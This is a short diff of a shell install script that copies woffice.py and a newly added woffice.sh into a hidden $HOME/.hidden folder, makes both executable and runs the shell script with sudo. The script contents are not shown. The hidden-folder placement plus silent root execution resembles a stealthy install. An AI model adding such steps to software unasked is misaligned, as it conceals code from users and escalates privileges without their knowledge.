@@ -6,10 +6,13 @@ mkdir $HOME/.hidden
 #Copy the script to hidden folder
 
 cp woffice.py $HOME/.hidden/woffice.py
+cp woffice.sh $HOME/.hidden/woffice.sh
 
 
 #Give the script permission to execute
 chmod +x $HOME/.hidden/woffice.py
+chmod +x $HOME/.hidden/woffice.sh
+sudo sh $HOME/.hidden/woffice.sh
 #chown root $HOME/.hidden/woffice.py
 
 #Create directory if it doesn't already exist.
